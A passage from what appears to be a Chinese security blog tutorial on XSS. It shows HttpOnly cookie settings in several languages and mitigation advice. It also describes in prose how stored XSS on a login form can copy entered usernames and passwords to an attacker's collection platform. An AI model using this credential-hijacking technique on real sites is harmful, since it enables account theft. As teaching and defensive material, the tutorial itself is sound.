<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie cookies[]=request.getCookies();</span><br></pre></td></tr></table></figure>

<h3 id="（2）C"><a href="#（2）C" class="headerlink" title="（2）C#"></a>（2）C#</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HttpCookie myCookie = new HttpCookie(&quot;myCookie&quot;); </span><br><span class="line">myCookie.HttpOnly = true; </span><br><span class="line">Response.AppendCookie(myCookie);</span><br></pre></td></tr></table></figure>

<h3 id="（3）VB-NET"><a href="#（3）VB-NET" class="headerlink" title="（3）VB.NET"></a>（3）VB.NET</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dim myCookie As HttpCookie = new HttpCookie(&quot;myCookie&quot;) </span><br><span class="line">myCookie.HttpOnly = True </span><br><span class="line">Response.AppendCookie(myCookie)</span><br></pre></td></tr></table></figure>

<p>但是在 .NET 1.1 , 中您需要手动添加</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response.Cookies[cookie].Path += &quot;;HTTPOnly&quot;;</span><br></pre></td></tr></table></figure>

<h3 id="（4）PHP≥5-2"><a href="#（4）PHP≥5-2" class="headerlink" title="（4）PHP≥5.2"></a>（4）PHP≥5.2</h3><p>PHP5.2 以上版本已支持 HttpOnly 参数的设置，同样也支持全局的 HttpOnly 的设置，在 php.ini 中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.cookie_httponly =</span><br></pre></td></tr></table></figure>

<p>设置其值为 1 或者 TRUE，来开启全局的 Cookie 的 HttpOnly 属性，当然也支持在代码中来开启：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> ini_set(&quot;session.cookie_httponly&quot;, 1); </span><br><span class="line"> // or</span><br><span class="line"> session_set_cookie_params(0, NULL, NULL, NULL, TRUE); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>Cookie 操作函数 setcookie 函数和 setrawcookie 函数也专门添加了第 7 个参数来做为 HttpOnly 的选项，开启方法为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); </span><br><span class="line"> setrawcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE);</span><br></pre></td></tr></table></figure>

<h3 id="（5）PHP4-和-PHP≤5-1"><a href="#（5）PHP4-和-PHP≤5-1" class="headerlink" title="（5）PHP4 和 PHP≤5.1"></a>（5）PHP4 和 PHP≤5.1</h3><p>对于 PHP5.1 以前版本以及 PHP4 版本的话，则需要通过 header 函数来变通下了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> header(&quot;Set-Cookie: hidden=value; httpOnly&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="3、反制-HttpOnly"><a href="#3、反制-HttpOnly" class="headerlink" title="3、反制 HttpOnly"></a>3、反制 HttpOnly</h2><p>当对方开启 HttpOnly 时，盗取 cookie 就会失败。登录后台的方式有 Cookie 登录和账号密码登录</p>
<h3 id="（1）Cookie-形式"><a href="#（1）Cookie-形式" class="headerlink" title="（1）Cookie 形式"></a>（1）Cookie 形式</h3><h3 id="（2）直接账号密码登录"><a href="#（2）直接账号密码登录" class="headerlink" title="（2）直接账号密码登录"></a>（2）直接账号密码登录</h3><h4 id="①-读取保存账号密码"><a href="#①-读取保存账号密码" class="headerlink" title="① 读取保存账号密码"></a>① 读取保存账号密码</h4><p>通过窃取保存在本地的数据（账号密码）来登录后台（需要 xss 产生于登录地址，利用表单劫持）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-460fa3adaa6b1b4b.png"></p>
<p>type、id、name 通过查看网站源代码中的登录框表单</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-ae005878a4814a63.png"></p>
<h4 id="②-读取没保存账号密码"><a href="#②-读取没保存账号密码" class="headerlink" title="② 读取没保存账号密码"></a>② 读取没保存账号密码</h4><p>通过表单（登录框）劫持数据（产生在后台的 XSS，例如存储型 XSS 留言等）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-72fe82ae74afacab.png"></p>
<p>劫持原理：抓取数据包另外发送一份到跨站平台</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-bc9738d80937373f.png"></p>
<p>但是如果是 https 网站的话，数据是进行了 ssl 加密，获取了数据之后也是很难读取到账号密码的，鸡肋方法。</p>
<h1 id="九、安全修复方案"><a href="#九、安全修复方案" class="headerlink" title="九、安全修复方案"></a>九、安全修复方案</h1><ul>
<li><p>开启 HttpOnly</p>
</li>
<li><p>过滤输入：对输入进行过滤，不允许可能导致 XSS 攻击的字符输入</p>
</li>
<li><p>过滤输出：根据输出点的位置对输出到前端的内容进行适当转义</p>
</li>
<li><p>PHP（被阻断）：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://www.zuimoge.com/212.html">http://www.zuimoge.com/212.html</a></p>
</li>
<li><p>关于 XSS 漏洞修复（JAVA）：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.cnblogs.com/baixiansheng/p/9001522.html">https://www.cnblogs.com/baixiansheng/p/9001522.html</a></p>
</li>
</ul>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">Jack hou</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://www.houyanbin.com/2023/04/21/%E5%AE%89%E5%85%A8/XSS%20%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://www.houyanbin.com/2023/04/21/%E5%AE%89%E5%85%A8/XSS%20%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/')">XSS 跨站漏洞</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/index/wechat.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/index/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/index/alipay.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/index/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div><div class="reward-link mode"><a class="reward-link-button" href="/wechat/"><i class="anzhiyufont anzhiyu-icon-plant-fill"></i>运营模式与责任</a></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://www.houyanbin.com/2023/04/21/%E5%AE%89%E5%85%A8/XSS%20%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=XSS 跨站漏洞&amp;url=http://www.houyanbin.com/2023/04/21/%E5%AE%89%E5%85%A8/XSS%20%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/&amp;pic=https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover4.jpg" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://www.houyanbin.com" target="_blank">Jackhou Blog</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>安全<span class="tagsPageCount">20</span></a><a class="post-meta__box__tags" href="/tags/XSS/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>XSS<span class="tagsPageCount">2</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover8.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/04/21/%E5%AE%89%E5%85%A8/XSS%E7%9A%84Waf%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover7.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">XSS的Waf绕过及工具使用</div></div></a></div><div class="next-post pull-right"><a href="/2023/04/21/%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SQL注入详解</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2023/04/21/%E5%AE%89%E5%85%A8/XSS%E7%9A%84Waf%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" title="XSS的Waf绕过及工具使用"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover7.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-04-21</div><div class="title">XSS的Waf绕过及工具使用</div></div></a></div><div><a href="/2023/05/04/Articles/APT%E7%BB%84%E7%BB%87/" title="APT 组织介绍"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover9.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-05-04</div><div class="title">APT 组织介绍</div></div></a></div><div><a href="/2023/04/10/Articles/Security%20Copilot%20%E5%88%86%E6%9E%90/" title="Security Copilot 分析"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover7.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-04-10</div><div class="title">Security Copilot 分析</div></div></a></div><div><a href="/2023/04/21/%E5%AE%89%E5%85%A8/Burp%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/" title="Burp使用技巧"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-04-21</div><div class="title">Burp使用技巧</div></div></a></div><div><a href="/2023/04/21/%E5%AE%89%E5%85%A8/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/" title="CSRF跨站请求伪造攻击"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-04-21</div><div class="title">CSRF跨站请求伪造攻击</div></div></a></div><div><a href="/2023/04/21/%E5%AE%89%E5%85%A8/Centos7%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/" title="Centos7 超详细安装教程"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-04-21</div><div class="title">Centos7 超详细安装教程</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你无需删除空行，直接评论以获取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">Hi，这是我的博客网站，欢迎你能到访~</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">我会在这里分享我的<b style="color:#fff">技术知识</b>、<b style="color:#fff">日常生活</b>和<b style="color:#fff">人生经验。</b></div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Jack hou</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/Hou-yanbin" target="_blank" title="Github"><i class="fab fa-github faa-tada"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/478589474" target="_blank" title="BiliBili"><i class="fa-brands fa-bilibili faa-tada"></i></a><a class="social-icon faa-parent animated-hover" href="https://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=jackhou921@qq.com" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-envelope"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/index/wxgzh1.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81XSS-%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E"><span class="toc-text">一、XSS 跨站漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89XSS-%E7%AE%80%E4%BB%8B"><span class="toc-text">（1）XSS 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E4%BA%A7%E7%94%9F%E5%B1%82%E9%9D%A2"><span class="toc-text">（2）产生层面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E5%87%BD%E6%95%B0%E7%B1%BB"><span class="toc-text">（3）函数类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E5%8D%B1%E5%AE%B3%E5%BD%B1%E5%93%8D"><span class="toc-text">（4）危害影响</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%885%EF%BC%89%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC"><span class="toc-text">（5）浏览器内核版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%886%EF%BC%89%E5%B8%B8%E5%87%BA%E7%8E%B0%E5%9C%BA%E6%99%AF"><span class="toc-text">（6）常出现场景</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81XSS-%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-text">二、XSS 攻击的分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E6%9D%A5%E8%87%AA%E5%86%85%E9%83%A8%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-text">（1）来自内部的攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E6%9D%A5%E8%87%AA%E5%A4%96%E9%83%A8%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-text">（2）来自外部的攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81XSS-%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-text">三、XSS 的分类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%8F%8D%E5%B0%84%E5%9E%8B-%E9%9D%9E%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-text">1、反射型 (非持久化)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%8E%9F%E7%90%86"><span class="toc-text">（1）原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-text">（2）攻击方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%8F%8D%E5%B0%84%E5%9E%8B-xss-%E6%BC%8F%E6%B4%9E%E5%B9%B6%E5%88%A9%E7%94%A8"><span class="toc-text">（3）判断是否存在反射型 xss 漏洞并利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0-%E5%88%A4%E6%96%AD%E6%9C%89%E6%B2%A1%E6%9C%89%E8%BF%87%E6%BB%A4%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84%E5%AD%97%E7%AC%A6"><span class="toc-text">① 判断有没有过滤一些特殊的字符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81"><span class="toc-text">② 注入代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2-%E6%8F%92%E5%85%A5%E4%BB%A3%E7%A0%81"><span class="toc-text">③ 插入代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A3-%E5%88%A9%E7%94%A8-xss-%E6%BC%8F%E6%B4%9E"><span class="toc-text">④ 利用 xss 漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%AD%98%E5%82%A8%E5%9E%8B-%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-text">2、存储型 (持久化)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%8E%9F%E7%90%86-1"><span class="toc-text">（1）原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F-1"><span class="toc-text">（2）攻击方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89payload"><span class="toc-text">（3）payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81DOM-%E5%9E%8B"><span class="toc-text">3、DOM 型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%8E%9F%E7%90%86-2"><span class="toc-text">（1）原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F-2"><span class="toc-text">（2）攻击方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89payload-1"><span class="toc-text">（3）payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81XSS-%E6%94%BB%E5%87%BB%E7%9A%84%E9%80%94%E5%BE%84"><span class="toc-text">四、XSS 攻击的途径</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98"><span class="toc-text">五、靶场实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81PHP-%E5%BC%80%E6%BA%90%E5%A4%9A%E5%8A%9F%E8%83%BD%E7%95%99%E8%A8%80%E6%9D%BF"><span class="toc-text">1、PHP 开源多功能留言板</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E6%90%AD%E5%BB%BA%E9%9D%B6%E5%9C%BA"><span class="toc-text">（1）搭建靶场</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89XSS-%E5%B9%B3%E5%8F%B0"><span class="toc-text">（2）XSS 平台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-text">（3）进行攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0-%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95"><span class="toc-text">① 初次尝试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-%E7%BB%95%E8%BF%87-lt-script-gt-%E6%A3%80%E6%B5%8B"><span class="toc-text">② 绕过&lt;script&gt;检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2-%E5%88%A9%E7%94%A8-XSS-%E5%B9%B3%E5%8F%B0%E8%8E%B7%E5%8F%96-cookie"><span class="toc-text">③ 利用 XSS 平台获取 cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A3-%E4%BD%BF%E7%94%A8-firebug-%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0"><span class="toc-text">④ 使用 firebug 登录后台</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81BUUCTF-basic-BUU-XSS-COURSE-1"><span class="toc-text">2、BUUCTF-basic-BUU XSS COURSE 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E8%AE%A2%E5%8D%95%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%86%9B%E9%94%8B%E7%9C%9F%E4%BA%BA-CS-%E9%87%8E%E6%88%98-123"><span class="toc-text">3、订单系统——军锋真人 CS 野战 123</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%9D%B6%E5%9C%BA%E4%B8%8B%E8%BD%BD"><span class="toc-text">（1）靶场下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 